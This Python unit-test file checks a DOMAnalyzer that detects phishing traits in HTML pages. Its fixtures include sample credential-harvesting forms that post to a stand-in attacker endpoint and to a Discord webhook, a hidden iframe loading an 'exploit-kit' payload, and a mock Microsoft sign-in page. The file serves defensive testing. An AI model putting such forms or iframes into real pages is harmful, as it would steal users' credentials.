"""Unit tests for DOMAnalyzer (DOM syntax, credential forms, and brand impersonation)."""

import unittest
from src.sandbox.dom_analyzer import DOMAnalyzer


class TestDOMAnalyzer(unittest.TestCase):
    """Test suite for HTML DOM credential harvesting and brand mismatch analysis."""

    def setUp(self):
        self.analyzer = DOMAnalyzer()

    def test_password_and_sensitive_input_detection(self):
        """Verify detection of password input and credit card/SSN fields."""
        html_code = """
        <html>
            <head><title>Secure Verification</title></head>
            <body>
                <form action="/submit" method="post">
                    <input type="text" name="username" placeholder="Username">
                    <input type="password" name="password" placeholder="Password">
                    <input type="text" name="card_number" placeholder="Card Number">
                    <input type="text" name="cvv" placeholder="CVV">
                    <button type="submit">Verify</button>
                </form>
            </body>
        </html>
        """
        res = self.analyzer.analyze_html(html_code, "https://secure-portal.com/login")
        self.assertTrue(res.has_password_input)
        self.assertTrue(res.has_sensitive_input)
        self.assertIn("cvv", res.sensitive_field_names)
        self.assertIn("card_number", res.sensitive_field_names)
        self.assertGreater(res.risk_score, 0.5)

    def test_external_form_action_with_password(self):
        """Verify credential exfiltration: form with password posting to external domain."""
        html_code = """
        <html>
            <body>
                <form action="https://evil-stealer-endpoint.xyz/harvest.php" method="post">
                    <input type="password" name="pwd">
                </form>
            </body>
        </html>
        """
        res = self.analyzer.analyze_html(html_code, "https://innocent-compromised-site.com/auth")
        self.assertTrue(res.has_password_input)
        self.assertTrue(res.has_external_form_action)
        self.assertTrue(any("CRITICAL" in t for t in res.detected_threats))

    def test_webhook_exfiltration_detection(self):
        """Verify detection of Discord/Telegram exfiltration webhooks."""
        html_code = """
        <html>
            <body>
                <form action="https://discord.com/api/webhooks/12345/abcdef" method="post">
                    <input type="text" name="key">
                </form>
            </body>
        </html>
        """
        res = self.analyzer.analyze_html(html_code, "https://portal.com")
        self.assertTrue(res.has_webhook_exfiltration)

    def test_hidden_iframe_detection(self):
        """Verify detection of hidden/cloaked iframes."""
        html_code = """
        <html>
            <body>
                <iframe src="https://exploit-kit.xyz/payload" style="display:none; visibility:hidden;" width="0" height="0"></iframe>
            </body>
        </html>
        """
        res = self.analyzer.analyze_html(html_code, "https://normal-page.com")
        self.assertTrue(res.has_hidden_iframe)
        self.assertIn("https://exploit-kit.xyz/payload", res.hidden_iframe_sources)

    def test_obfuscated_scripts(self):
        """Verify detection of eval, atob, and unescape obfuscation."""
        html_code = """
        <html>
            <head>
                <script>
                    var _0x12 = atob("c2VjdXJl");
                    eval(unescape("%77%69%6E%64%6F%77"));
                </script>
            </head>
            <body>Welcome</body>
        </html>
        """
        res = self.analyzer.analyze_html(html_code, "https://test.com")
        self.assertTrue(res.has_obfuscated_scripts)
        self.assertTrue(any("eval" in ind for ind in res.obfuscation_indicators))
        self.assertTrue(any("atob" in ind for ind in res.obfuscation_indicators))

    def test_brand_identity_mismatch(self):
        """Verify page claiming to be Microsoft on untrusted domain triggers brand mismatch."""
        html_code = """
        <html>
            <head><title>Sign in to your Microsoft account</title></head>
            <body>
                <form action="/login" method="post">
                    <input type="password" name="passwd">
                </form>
            </body>
        </html>
        """
        # Hosted on malicious unrelated domain
        res_phish = self.analyzer.analyze_html(html_code, "https://microsoft-verify-auth.xyz/login")
        self.assertTrue(res_phish.has_brand_mismatch)
        self.assertEqual(res_phish.impersonated_brand, "Microsoft")

        # Hosted on genuine Microsoft domain
        res_legit = self.analyzer.analyze_html(html_code, "https://login.microsoft.com/common/oauth2")
        self.assertFalse(res_legit.has_brand_mismatch)


if __name__ == "__main__":
    unittest.main()

